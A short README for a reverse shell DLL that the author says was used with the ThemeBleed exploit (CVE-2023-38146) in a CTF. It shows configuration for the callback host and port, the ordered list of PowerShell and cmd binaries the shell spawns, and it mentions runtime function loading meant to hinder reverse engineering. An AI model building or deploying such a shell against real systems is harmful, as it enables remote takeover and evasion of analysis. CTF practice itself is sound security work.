# ThemeBleed Reverse Shell DLL

Example reverse shell DLL I used in combination with the ThemeBleed exploit (https://github.com/Jnnshschl/CVE-2023-38146) in a CTF.

Some functions will be loaded at runtime using my RTFN stuff, this makes analysis of this shell a big pain for reverse engineers.

Make sure to build as "Release" and adjust these vars to your need:

```c++
constexpr auto rHost = "10.10.14.158";
constexpr auto rPort = "4711";
constexpr auto autoReconnect = false;
```

The shell is going to search for executables in the order which they appear in this array:

```c++
const char* rBinaries[]{
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "C:\\Windows\\System32\\cmd.exe",
    "powershell.exe",
    "cmd.exe"
};
```
